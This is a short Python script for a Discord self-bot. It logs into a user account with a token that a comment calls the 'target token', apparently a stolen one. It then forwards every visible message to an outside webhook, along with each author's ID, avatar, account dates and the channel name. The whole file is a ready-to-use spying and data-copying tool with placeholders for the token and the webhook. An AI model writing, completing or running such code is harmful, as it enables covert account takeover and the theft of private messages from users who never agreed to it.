import discord
from discord.ext import commands
import asyncio
from dhooks import Webhook, Embed



#from keep_alive import keep_alive

token = "Your Token (not bottoken)" #insert target token
prefix = ""

hook = Webhook('your webhook')
bot = commands.Bot(command_prefix=prefix, self_bot=True)
@bot.event
async def on_ready():
    print('online')

@bot.event
async def on_message(message):
    

    date_format = "%a, %d %b %Y %I:%M %p"
    user = message.author
    member = message.author
    embed = Embed()
    embed.set_author(name=f'{message.author}', icon_url=f'{user.avatar_url}')
    embed.set_thumbnail(url=f'{user.avatar_url}')
    embed.add_field(name="user id", value=message.author.id)
    embed.add_field(name="created at", value=f"{member.created_at.date()}".replace("-", "/"), inline=True)
    embed.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    embed.add_field(name="channel", value=message.channel.name)
    #print(message.content)
    embed.add_field(name="message", value=f'{message.content}')

    
    hook.send(embed=embed)
asyncio.set_event_loop(asyncio.new_event_loop())
loop = asyncio.new_event_loop()
#keep_alive()
bot.run(token)